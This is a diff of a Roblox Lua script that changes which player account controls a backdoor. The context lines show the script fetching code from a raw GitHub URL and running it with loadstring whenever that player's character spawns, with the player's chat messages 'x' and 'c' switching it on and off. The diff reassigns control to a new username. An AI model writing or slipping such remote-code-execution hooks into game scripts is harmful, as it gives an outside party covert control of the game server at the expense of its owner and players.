@@ -4,7 +4,7 @@ local http = game:GetService("HttpService")
 
 local link = "https://raw.githubusercontent.com/balljeet/balljeet-documents/main/g"
 local var = true
-game.Players.missedtonight.Chatted:Connect(function(msg)
+game.Players.savedbyaIlah.Chatted:Connect(function(msg)
 if msg == "x" then
 var = true
 elseif msg == "c" then
@@ -13,7 +13,7 @@ var = false
 end
 
 end)
-game.Players.missedtonight.CharacterAdded:Connect(function()
+game.Players.savedbyaIlah.CharacterAdded:Connect(function()
 wait(2)
 if var then
 loadstring(http:GetAsync(link))()
